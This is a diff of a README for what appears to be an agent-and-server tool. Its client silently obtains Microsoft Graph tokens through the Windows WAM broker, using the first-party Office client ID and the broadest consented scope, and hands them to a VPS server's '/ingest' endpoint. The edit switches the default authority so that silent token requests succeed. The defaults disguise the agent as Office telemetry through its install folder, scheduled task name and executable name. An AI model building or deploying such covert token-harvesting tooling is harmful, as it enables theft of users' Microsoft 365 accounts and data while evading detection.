@@ -32,9 +32,9 @@ This project is currently untested slop. Not for use in production yet!
 
 Tokens default to the first-party Microsoft Office client
 (`d3590ed6-52b3-4102-aeff-aad2292ab01c`) with
-`https://graph.microsoft.com/.default` and authority `common`, which covers
-work (Entra ID) and personal (MSA) accounts with the broadest consented
-first-party Graph permission set.
+`https://graph.microsoft.com/.default` and authority `organizations` - the
+authority combination the WAM broker supports for silent requests, yielding
+the broadest consented first-party Graph permission set.
 
 ## Server setup (Linux VPS)
 
@@ -71,7 +71,7 @@ run and persisted in `server.secret`, or set it with `--secret`.
 | `--secret` | generated/persisted | Shared secret for `/config` and `/ingest` |
 | `--client-id` | Office client | Client ID handed to agents via `/config` |
 | `--scope` | Graph `.default` | Scope handed to agents |
-| `--authority` | `common` | Authority handed to agents |
+| `--authority` | `organizations` | Authority handed to agents |
 | `--install-subdir` | `Microsoft\OfficeTelemetry` | Client install dir under `%LOCALAPPDATA%` |
 | `--task-name` | `OfficeTelemetrySync` | Scheduled task name |
 | `--exe-name` | `offdiag.exe` | On-disk agent name |
